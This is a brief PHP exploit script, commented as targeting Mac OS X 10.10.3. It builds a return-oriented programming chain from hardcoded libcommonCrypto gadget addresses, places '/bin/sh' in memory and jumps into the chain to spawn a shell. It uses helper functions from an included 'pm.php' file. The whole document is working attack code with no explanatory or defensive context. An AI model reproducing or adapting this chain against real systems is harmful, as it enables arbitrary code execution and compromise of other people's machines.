<?
// for Mac OS X 10.10.3, libcommonCrypto ROP

require("pm.php");
$all=alloc(8);
memcpy($all, "/bin/sh\0", 8);
$rop=ibuf(0,8).ibuf(0,8).ibuf(0x7fff86e6a062,8).ibuf(0x7fff86e6d17C,8).ibuf(0x7fff86e6d286,8).ibuf($all['ptr'],8).ibuf(0,8).ibuf(0x7fff893c705d,8).ibuf(0x7fff893a6b99,8);
jump(0x7fff86e6764f, $rop, strlen($rop));
?>
